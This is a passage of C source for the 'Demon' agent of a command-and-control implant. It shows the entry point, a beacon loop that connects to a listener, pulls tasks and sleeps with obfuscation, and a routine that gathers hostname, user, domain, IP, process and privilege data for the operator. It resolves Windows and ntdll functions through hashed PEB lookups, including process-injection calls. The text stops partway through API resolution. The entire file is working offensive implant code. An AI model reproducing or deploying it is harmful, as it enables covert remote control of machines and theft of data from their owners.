#include <Demon.h>

/* Import Common Headers */
#include <common/Defines.h>
#include <common/Macros.h>

/* Import Core Headers */
#include <core/Transport.h>
#include <core/SleepObf.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/SysNative.h>
#include <core/Runtime.h>

/* Import Inject Headers */
#include <inject/Inject.h>

/* Import Inject Headers */
#include <core/ObjectApi.h>

/* Global Variables */
SEC_DATA void*  Instance      = NULL;
SEC_DATA BYTE   AgentConfig[] = CONFIG_BYTES;

/*
 * In DemonMain it should go as followed:
 *
 * 1. Initialize pointer, modules and win32 api
 * 2. Initialize metadata
 * 3. Parse config
 * 4. Enter main connecting and tasking routine
 *
 */
VOID DemonMain( PVOID ModuleInst, PKAYN_ARGS KArgs )
{
    INSTANCE Inst = { 0 };

    /* "allocate" instance on stack */
    Instance = & Inst;

    /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
    DemonInit( ModuleInst, KArgs );

    /* Initialize MetaData */
    DemonMetaData( ((INSTANCE *)Instance)->MetaData, TRUE );

    /* Main demon routine */
    DemonRoutine();
}

/* Main demon routine:
 *
 * 1. Connect to listener
 * 2. Go into tasking routine:
 *      A. Sleep Obfuscation.
 *      B. Request for the task queue
 *      C. Parse Task
 *      D. Execute Task (if it's not DEMON_COMMAND_NO_JOB)
 *      E. Goto C (we do this til there is nothing left)
 *      F. Goto A (we have nothing else to execute then lets sleep and after waking up request for more)
 * 3. Sleep Obfuscation. After that lets try to connect to the listener again
 */
_Noreturn
VOID DemonRoutine()
{
    /* the main loop */
    for ( ;; )
    {
        /* if we aren't connected then lets connect to our host */
        if ( ! ((INSTANCE *)Instance)->Session.Connected )
        {
            /* Connect to our listener */
            if ( TransportInit() )
            {

#ifdef TRANSPORT_HTTP
                /* reset the failure counter since we managed to connect to it. */
                ((INSTANCE *)Instance)->Config.Transport.Host->Failures = 0;
#endif
            }
        }

        if ( ((INSTANCE *)Instance)->Session.Connected )
        {
            /* Enter tasking routine */
            CommandDispatcher();
        }

        /* Sleep for a while (with encryption if specified) */
        SleepObf();
    }
}

/* Init metadata buffer/package. */
VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
{
    PVOID            Data       = NULL;
    PIP_ADAPTER_INFO Adapter    = NULL;
    OSVERSIONINFOEXW OsVersions = { 0 };
    SIZE_T           Length     = 0;
    DWORD            dwLength   = 0;

    /* Check we if we want to add the Agent Header + CommandID too */
    if ( Header )
    {
        *MetaData = PackageCreateWithMetaData( DEMON_INITIALIZE );

        /* Do not destroy this package if we fail to connect to the listener. */
        ( *MetaData )->Destroy = FALSE;
    }

    // create AES Keys/IV
    if ( ((INSTANCE *)Instance)->Config.AES.Key == NULL && ((INSTANCE *)Instance)->Config.AES.IV == NULL )
    {
        ((INSTANCE *)Instance)->Config.AES.Key = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, 32 );
        ((INSTANCE *)Instance)->Config.AES.IV  = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, 16 );

        for ( SHORT i = 0; i < 32; i++ )
            ((INSTANCE *)Instance)->Config.AES.Key[ i ] = RandomNumber32();

        for ( SHORT i = 0; i < 16; i++ )
            ((INSTANCE *)Instance)->Config.AES.IV[ i ]  = RandomNumber32();
    }

    /*

     Header (if specified):
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Request ID   ] 4 bytes

     MetaData:
        [ AES KEY      ] 32 bytes
        [ AES IV       ] 16 bytes
        [ Magic Value  ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ Host Name    ] size + bytes
        [ User Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ Base Address ] 8 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
        [ SleepDelay   ] 4 bytes
        [ SleepJitter  ] 4 bytes
        [ Killdate     ] 8 bytes
        [ WorkingHours ] 4 bytes
        ..... more
        [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
    */

    // Add AES Keys/IV
    PackageAddPad( *MetaData, ( PCHAR ) ((INSTANCE *)Instance)->Config.AES.Key, 32 );
    PackageAddPad( *MetaData, ( PCHAR ) ((INSTANCE *)Instance)->Config.AES.IV,  16 );

    // Add session id
    PackageAddInt32( *MetaData, ((INSTANCE *)Instance)->Session.AgentID );

    // Get Computer name
    dwLength = 0;
    if ( ! ((INSTANCE *)Instance)->Win32.GetComputerNameExA( ComputerNameNetBIOS, NULL, &dwLength ) )
    {
        if ( ( Data = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            MemSet( Data, 0, dwLength );
            if ( ((INSTANCE *)Instance)->Win32.GetComputerNameExA( ComputerNameNetBIOS, Data, &dwLength ) )
                PackageAddBytes( *MetaData, Data, dwLength );
            else
                PackageAddInt32( *MetaData, 0 );
            MemSet( Data, 0, dwLength );
            ((INSTANCE *)Instance)->Win32.LocalFree( Data );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Username
    dwLength = 0;
    if ( ! ((INSTANCE *)Instance)->Win32.GetUserNameA( NULL, &dwLength ) )
    {
        if ( ( Data = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            MemSet( Data, 0, dwLength );
            if ( ((INSTANCE *)Instance)->Win32.GetUserNameA( Data, &dwLength ) )
                PackageAddBytes( *MetaData, Data, dwLength );
            else
                PackageAddInt32( *MetaData, 0 );
            MemSet( Data, 0, dwLength );
            ((INSTANCE *)Instance)->Win32.LocalFree( Data );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Domain
    dwLength = 0;
    if ( ! ((INSTANCE *)Instance)->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &dwLength ) )
    {
        if ( ( Data = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            MemSet( Data, 0, dwLength );
            if ( ((INSTANCE *)Instance)->Win32.GetComputerNameExA( ComputerNameDnsDomain, Data, &dwLength ) )
                PackageAddBytes( *MetaData, Data, dwLength );
            else
                PackageAddInt32( *MetaData, 0 );
            MemSet( Data, 0, dwLength );
            ((INSTANCE *)Instance)->Win32.LocalFree( Data );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get internal IP
    dwLength = 0;
    if ( ((INSTANCE *)Instance)->Win32.GetAdaptersInfo( NULL, &dwLength ) )
    {
        if ( ( Adapter = ((INSTANCE *)Instance)->Win32.LocalAlloc( LPTR, dwLength ) ) )
        {
            if ( ((INSTANCE *)Instance)->Win32.GetAdaptersInfo( Adapter, &dwLength ) == NO_ERROR )
                PackageAddString( *MetaData, Adapter->IpAddressList.IpAddress.String );
            else
                PackageAddInt32( *MetaData, 0 );
            MemSet( Adapter, 0, dwLength );
            ((INSTANCE *)Instance)->Win32.LocalFree( Adapter );
        }
        else
            PackageAddInt32( *MetaData, 0 );
    }
    else
        PackageAddInt32( *MetaData, 0 );

    // Get Process Path
    PackageAddWString( *MetaData, ( ( PRTL_USER_PROCESS_PARAMETERS ) ((INSTANCE *)Instance)->Teb->ProcessEnvironmentBlock->ProcessParameters )->ImagePathName.Buffer );

    PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) ((INSTANCE *)Instance)->Teb->ClientId.UniqueProcess );
    PackageAddInt32( *MetaData, ( DWORD ) ( ULONG_PTR ) ((INSTANCE *)Instance)->Teb->ClientId.UniqueThread );
    PackageAddInt32( *MetaData, ((INSTANCE *)Instance)->Session.PPID );
    PackageAddInt32( *MetaData, PROCESS_AGENT_ARCH );
    PackageAddInt32( *MetaData, BeaconIsAdmin( ) );
    PackageAddInt64( *MetaData, U_PTR( ((INSTANCE *)Instance)->Session.ModuleBase ) );

    MemSet( &OsVersions, 0, sizeof( OsVersions ) );
    OsVersions.dwOSVersionInfoSize = sizeof( OsVersions );
    ((INSTANCE *)Instance)->Win32.RtlGetVersion( &OsVersions );
    PackageAddInt32( *MetaData, OsVersions.dwMajorVersion    );
    PackageAddInt32( *MetaData, OsVersions.dwMinorVersion    );
    PackageAddInt32( *MetaData, OsVersions.wProductType      );
    PackageAddInt32( *MetaData, OsVersions.wServicePackMajor );
    PackageAddInt32( *MetaData, OsVersions.dwBuildNumber     );
    PackageAddInt32( *MetaData, ((INSTANCE *)Instance)->Session.OS_Arch );

    PackageAddInt32( *MetaData, ((INSTANCE *)Instance)->Config.Sleeping );
    PackageAddInt32( *MetaData, ((INSTANCE *)Instance)->Config.Jitter );
    PackageAddInt64( *MetaData, ((INSTANCE *)Instance)->Config.Transport.KillDate );
    PackageAddInt32( *MetaData, ((INSTANCE *)Instance)->Config.Transport.WorkingHours );
}

VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
{
    OSVERSIONINFOEXW             OSVersionExW     = { 0 };
    PVOID                        RtModules[]      = {
            RtAdvapi32,
            //RtMscoree,
            RtOleaut32,
            RtUser32,
            RtShell32,
            RtMsvcrt,
            RtIphlpapi,
            RtGdi32,
            RtNetApi32,
            RtWs2_32,
            RtSspicli,
#ifdef TRANSPORT_HTTP
            RtWinHttp,
#endif
    };

    ((INSTANCE *)Instance)->Teb = NtCurrentTeb();

#ifdef TRANSPORT_HTTP
    PUTS( "TRANSPORT_HTTP" )
#endif

#ifdef TRANSPORT_SMB
    PUTS( "TRANSPORT_SMB" )
#endif


    /* resolve ntdll.dll functions */
    if ( ( ((INSTANCE *)Instance)->Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
        /* Module/Address function loading */
        ((INSTANCE *)Instance)->Win32.LdrGetProcedureAddress            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_LDRGETPROCEDUREADDRESS );
        ((INSTANCE *)Instance)->Win32.LdrLoadDll                        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_LDRLOADDLL );

        /* Rtl functions */
        ((INSTANCE *)Instance)->Win32.RtlAllocateHeap                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLALLOCATEHEAP );
        ((INSTANCE *)Instance)->Win32.RtlReAllocateHeap                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLREALLOCATEHEAP );
        ((INSTANCE *)Instance)->Win32.RtlFreeHeap                       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLFREEHEAP );
        ((INSTANCE *)Instance)->Win32.RtlExitUserThread                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLEXITUSERTHREAD );
        ((INSTANCE *)Instance)->Win32.RtlExitUserProcess                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLEXITUSERPROCESS );
        ((INSTANCE *)Instance)->Win32.RtlRandomEx                       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLRANDOMEX );
        ((INSTANCE *)Instance)->Win32.RtlNtStatusToDosError             = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLNTSTATUSTODOSERROR );
        ((INSTANCE *)Instance)->Win32.RtlGetVersion                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLGETVERSION );
        ((INSTANCE *)Instance)->Win32.RtlCreateTimerQueue               = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLCREATETIMERQUEUE );
        ((INSTANCE *)Instance)->Win32.RtlCreateTimer                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLCREATETIMER );
        ((INSTANCE *)Instance)->Win32.RtlQueueWorkItem                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLQUEUEWORKITEM );
        ((INSTANCE *)Instance)->Win32.RtlRegisterWait                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLREGISTERWAIT );
        ((INSTANCE *)Instance)->Win32.RtlDeleteTimerQueue               = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLDELETETIMERQUEUE );
        ((INSTANCE *)Instance)->Win32.RtlCaptureContext                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLCAPTURECONTEXT );
        ((INSTANCE *)Instance)->Win32.RtlAddVectoredExceptionHandler    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER );
        ((INSTANCE *)Instance)->Win32.RtlRemoveVectoredExceptionHandler = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
        ((INSTANCE *)Instance)->Win32.RtlCopyMappedMemory               = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_RTLCOPYMAPPEDMEMORY );

        /* Native functions */
        ((INSTANCE *)Instance)->Win32.NtClose                           = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTCLOSE );
        ((INSTANCE *)Instance)->Win32.NtCreateEvent                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTCREATEEVENT );
        ((INSTANCE *)Instance)->Win32.NtSetEvent                        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTSETEVENT );
        ((INSTANCE *)Instance)->Win32.NtSetInformationThread            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTSETINFORMATIONTHREAD );
        ((INSTANCE *)Instance)->Win32.NtSetInformationVirtualMemory     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTSETINFORMATIONVIRTUALMEMORY );
        ((INSTANCE *)Instance)->Win32.NtGetNextThread                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTGETNEXTTHREAD );
        ((INSTANCE *)Instance)->Win32.NtOpenProcess                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTOPENPROCESS );
        ((INSTANCE *)Instance)->Win32.NtTerminateProcess                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTTERMINATEPROCESS );
        ((INSTANCE *)Instance)->Win32.NtQueryInformationProcess         = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONPROCESS );
        ((INSTANCE *)Instance)->Win32.NtQuerySystemInformation          = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTQUERYSYSTEMINFORMATION );
        ((INSTANCE *)Instance)->Win32.NtAllocateVirtualMemory           = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTALLOCATEVIRTUALMEMORY );
        ((INSTANCE *)Instance)->Win32.NtQueueApcThread                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTQUEUEAPCTHREAD );
        ((INSTANCE *)Instance)->Win32.NtOpenThread                      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTOPENTHREAD );
        ((INSTANCE *)Instance)->Win32.NtOpenThreadToken                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTOPENTHREADTOKEN );
        ((INSTANCE *)Instance)->Win32.NtResumeThread                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTRESUMETHREAD );
        ((INSTANCE *)Instance)->Win32.NtSuspendThread                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTSUSPENDTHREAD );
        ((INSTANCE *)Instance)->Win32.NtCreateEvent                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTCREATEEVENT );
        ((INSTANCE *)Instance)->Win32.NtDuplicateObject                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTDUPLICATEOBJECT );
        ((INSTANCE *)Instance)->Win32.NtGetContextThread                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTGETCONTEXTTHREAD );
        ((INSTANCE *)Instance)->Win32.NtSetContextThread                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTSETCONTEXTTHREAD );
        ((INSTANCE *)Instance)->Win32.NtWaitForSingleObject             = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTWAITFORSINGLEOBJECT );
        ((INSTANCE *)Instance)->Win32.NtAlertResumeThread               = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTALERTRESUMETHREAD );
        ((INSTANCE *)Instance)->Win32.NtSignalAndWaitForSingleObject    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
        ((INSTANCE *)Instance)->Win32.NtTestAlert                       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTTESTALERT );
        ((INSTANCE *)Instance)->Win32.NtCreateThreadEx                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTCREATETHREADEX );
        ((INSTANCE *)Instance)->Win32.NtOpenProcessToken                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTOPENPROCESSTOKEN );
        ((INSTANCE *)Instance)->Win32.NtDuplicateToken                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTDUPLICATETOKEN );
        ((INSTANCE *)Instance)->Win32.NtProtectVirtualMemory            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTPROTECTVIRTUALMEMORY  );
        ((INSTANCE *)Instance)->Win32.NtTerminateThread                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTTERMINATETHREAD );
        ((INSTANCE *)Instance)->Win32.NtWriteVirtualMemory              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTWRITEVIRTUALMEMORY );
        ((INSTANCE *)Instance)->Win32.NtContinue                        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTCONTINUE );
        ((INSTANCE *)Instance)->Win32.NtReadVirtualMemory               = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTREADVIRTUALMEMORY );
        ((INSTANCE *)Instance)->Win32.NtFreeVirtualMemory               = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTFREEVIRTUALMEMORY );
        ((INSTANCE *)Instance)->Win32.NtUnmapViewOfSection              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTUNMAPVIEWOFSECTION );
        ((INSTANCE *)Instance)->Win32.NtQueryVirtualMemory              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTQUERYVIRTUALMEMORY );
        ((INSTANCE *)Instance)->Win32.NtQueryInformationToken           = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTOKEN );
        ((INSTANCE *)Instance)->Win32.NtQueryInformationThread          = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
        ((INSTANCE *)Instance)->Win32.NtQueryObject                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
        ((INSTANCE *)Instance)->Win32.NtTraceEvent                      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Ntdll, H_FUNC_NTTRACEEVENT );
    } else {
        PUTS( "Failed to load ntdll from PEB" )
        return;
    }

    /* resolve Windows version */
    ((INSTANCE *)Instance)->Session.OSVersion = WIN_VERSION_UNKNOWN;
    OSVersionExW.dwOSVersionInfoSize = sizeof( OSVersionExW );
    if ( NT_SUCCESS( ((INSTANCE *)Instance)->Win32.RtlGetVersion( &OSVersionExW ) ) ) {
        if ( OSVersionExW.dwMajorVersion >= 5 ) {
            if ( OSVersionExW.dwMajorVersion == 5 ) {
                if ( OSVersionExW.dwMinorVersion == 1 ) {
                    ((INSTANCE *)Instance)->Session.OSVersion = WIN_VERSION_XP;
                }
            } else if ( OSVersionExW.dwMajorVersion == 6 ) {
                if ( OSVersionExW.dwMinorVersion == 0 ) {
                    ((INSTANCE *)Instance)->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_VISTA : WIN_VERSION_2008;
                } else if ( OSVersionExW.dwMinorVersion == 1 ) {
                    ((INSTANCE *)Instance)->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_7 : WIN_VERSION_2008_R2;
                } else if ( OSVersionExW.dwMinorVersion == 2 ) {
                    ((INSTANCE *)Instance)->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8 : WIN_VERSION_2012;
                } else if ( OSVersionExW.dwMinorVersion == 3 ) {
                    ((INSTANCE *)Instance)->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8_1 : WIN_VERSION_2012_R2;
                }
            } else if ( OSVersionExW.dwMajorVersion == 10 ) {
                if ( OSVersionExW.dwMinorVersion == 0 ) {
                    ((INSTANCE *)Instance)->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_10 : WIN_VERSION_2016_X;
                }
            }
        }
    } PRINTF( "OSVersion: %d\n", ((INSTANCE *)Instance)->Session.OSVersion );

    /* load kernel32.dll functions */
    if ( ( ((INSTANCE *)Instance)->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
        ((INSTANCE *)Instance)->Win32.LoadLibraryW                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_LOADLIBRARYW );
        ((INSTANCE *)Instance)->Win32.VirtualProtectEx                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_VIRTUALPROTECTEX );
        ((INSTANCE *)Instance)->Win32.VirtualProtect                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_VIRTUALPROTECT );
        ((INSTANCE *)Instance)->Win32.LocalAlloc                      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_LOCALALLOC );
        ((INSTANCE *)Instance)->Win32.LocalReAlloc                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_LOCALREALLOC );
        ((INSTANCE *)Instance)->Win32.LocalFree                       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_LOCALFREE );
        ((INSTANCE *)Instance)->Win32.CreateRemoteThread              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CREATEREMOTETHREAD );
        ((INSTANCE *)Instance)->Win32.CreateToolhelp32Snapshot        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CREATETOOLHELP32SNAPSHOT );
        ((INSTANCE *)Instance)->Win32.Process32FirstW                 = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_PROCESS32FIRSTW );
        ((INSTANCE *)Instance)->Win32.Process32NextW                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_PROCESS32NEXTW );
        ((INSTANCE *)Instance)->Win32.CreatePipe                      = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CREATEPIPE );
        ((INSTANCE *)Instance)->Win32.CreateProcessW                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CREATEPROCESSW );
        ((INSTANCE *)Instance)->Win32.GetFullPathNameW                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETFULLPATHNAMEW );
        ((INSTANCE *)Instance)->Win32.CreateFileW                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CREATEFILEW );
        ((INSTANCE *)Instance)->Win32.GetFileSize                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETFILESIZE );
        ((INSTANCE *)Instance)->Win32.GetFileSizeEx                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETFILESIZEEX );
        ((INSTANCE *)Instance)->Win32.CreateNamedPipeW                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CREATENAMEDPIPEW );
        ((INSTANCE *)Instance)->Win32.ConvertFiberToThread            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CONVERTFIBERTOTHREAD );
        ((INSTANCE *)Instance)->Win32.CreateFiberEx                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CREATEFIBEREX );
        ((INSTANCE *)Instance)->Win32.ReadFile                        = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_READFILE );
        ((INSTANCE *)Instance)->Win32.VirtualAllocEx                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_VIRTUALALLOCEX );
        ((INSTANCE *)Instance)->Win32.WaitForSingleObjectEx           = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_WAITFORSINGLEOBJECTEX );
        ((INSTANCE *)Instance)->Win32.GetComputerNameExA              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETCOMPUTERNAMEEXA );
        ((INSTANCE *)Instance)->Win32.GetExitCodeProcess              = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETEXITCODEPROCESS );
        ((INSTANCE *)Instance)->Win32.GetExitCodeThread               = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETEXITCODETHREAD );
        ((INSTANCE *)Instance)->Win32.TerminateProcess                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_TERMINATEPROCESS );
        ((INSTANCE *)Instance)->Win32.ConvertThreadToFiberEx          = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CONVERTTHREADTOFIBEREX );
        ((INSTANCE *)Instance)->Win32.SwitchToFiber                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_SWITCHTOFIBER );
        ((INSTANCE *)Instance)->Win32.DeleteFiber                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_DELETEFIBER );
        ((INSTANCE *)Instance)->Win32.AllocConsole                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_ALLOCCONSOLE );
        ((INSTANCE *)Instance)->Win32.FreeConsole                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_FREECONSOLE );
        ((INSTANCE *)Instance)->Win32.GetConsoleWindow                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETCONSOLEWINDOW );
        ((INSTANCE *)Instance)->Win32.GetStdHandle                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETSTDHANDLE );
        ((INSTANCE *)Instance)->Win32.SetStdHandle                    = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_SETSTDHANDLE );
        ((INSTANCE *)Instance)->Win32.WaitNamedPipeW                  = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_WAITNAMEDPIPEW  );
        ((INSTANCE *)Instance)->Win32.PeekNamedPipe                   = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_PEEKNAMEDPIPE );
        ((INSTANCE *)Instance)->Win32.DisconnectNamedPipe             = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_DISCONNECTNAMEDPIPE );
        ((INSTANCE *)Instance)->Win32.WriteFile                       = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_WRITEFILE );
        ((INSTANCE *)Instance)->Win32.ConnectNamedPipe                = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_CONNECTNAMEDPIPE );
        ((INSTANCE *)Instance)->Win32.FreeLibrary                     = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_FREELIBRARY );
        ((INSTANCE *)Instance)->Win32.GetCurrentDirectoryW            = LdrFunctionAddr( ((INSTANCE *)Instance)->Modules.Kernel32, H_FUNC_GETCURRENTDIRECTORYW );
